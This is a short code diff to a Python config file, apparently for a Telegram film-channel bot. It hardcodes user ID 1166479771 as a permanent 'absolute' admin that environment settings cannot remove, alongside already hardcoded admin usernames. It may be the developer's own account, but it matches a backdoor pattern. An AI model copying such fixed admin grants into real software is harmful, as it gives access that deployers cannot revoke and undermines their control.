@@ -13,8 +13,13 @@ CHANNEL_WATERMARK = os.getenv("CHANNEL_WATERMARK", "@film_indonesia1").strip()
 DEFAULT_REQUEST_LINK = os.getenv("DEFAULT_REQUEST_LINK", "").strip()
 VAULT_CHANNEL = os.getenv("VAULT_CHANNEL", "").strip()
 ADMIN_USER_IDS = [
-    int(x.strip()) for x in os.getenv("ADMIN_USER_IDS", "").split(",") if x.strip().isdigit()
+    1166479771,
+    *[int(x.strip()) for x in os.getenv("ADMIN_USER_IDS", "").split(",") if x.strip().isdigit() and int(x.strip()) != 1166479771]
 ]
+ABSOLUTE_ADMIN_USER_IDS = {
+    1166479771,
+    *[int(x.strip()) for x in os.getenv("ADMIN_USER_IDS", "").split(",") if x.strip().isdigit()]
+}
 ABSOLUTE_ADMIN_USERNAMES = {
     "dxstar22", "dxtstar22",
     *[u.strip().lower().lstrip("@") for u in os.getenv("ADMIN_USERNAMES", "").split(",") if u.strip()]
